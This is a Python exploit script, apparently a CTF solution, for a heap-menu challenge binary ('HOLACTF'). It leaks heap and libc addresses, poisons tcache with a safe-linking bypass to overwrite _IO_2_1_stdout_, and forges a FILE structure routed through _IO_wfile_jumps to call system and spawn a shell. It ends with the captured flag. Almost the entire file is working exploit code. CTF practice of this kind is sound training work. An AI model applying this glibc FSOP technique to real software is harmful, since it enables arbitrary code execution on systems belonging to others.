#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x14F9
brva 0x172D
brva 0x1641
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'> ', choice)

def malloc(idx: int, size: int, data: bytes):
    menu(1)
    slna(b'book: ', idx)
    slna(b'book: ', size)
    sa(b'book: ', data)

def free(idx: int):
    menu(2)
    slna(b'book: ', idx)

def show(idx: int):
    menu(3)
    slna(b'book: ', idx)

# ==================== EXPLOIT ====================
p = start()


malloc(0, 0x800, b'0')
malloc(1, 0x20, b'1')

free(0)
malloc(2, 0x100, b'2' * 0x10)

show(2)
ru(b'2' * 0x10)
heap = fixleak(rl()[:-1])
slog('heap leak @ %#x', heap)


malloc(3, 0x100, b'3' * 0x8)
show(3)
ru(b'3' * 0x8)
libc.address = fixleak(rl()[:-1]) - 0x21ace0
slog('libc base @ %#x', libc.address)

for i in range(11):
    malloc(i, 0x100, str(chr(0x30+i)).encode())

for i in range(6):
    free(i)

free(8)
free(7)

free(6)
malloc(9, 0x100, p64(0xdeadbeef) * 2)

free(7)


payload = b'\x00'*0x108 + p64(0x111) + p64(libc.sym._IO_2_1_stdout_ ^ (heap >> 12))
malloc(10, len(payload) + 0x20, payload)
malloc(10, 0x100, b'11')

system = libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = libc.sym._IO_2_1_stdout_ + 0x50
fp._wide_data = libc.sym._IO_2_1_stdout_
fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(libc.sym._IO_2_1_stdout_ + 0x10 - 0x68)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

malloc(10, 0x100, payload)

interactive()
# HOLACTF{HOUS3_01_8OTc4Ke_?_d21da49cf3e3}
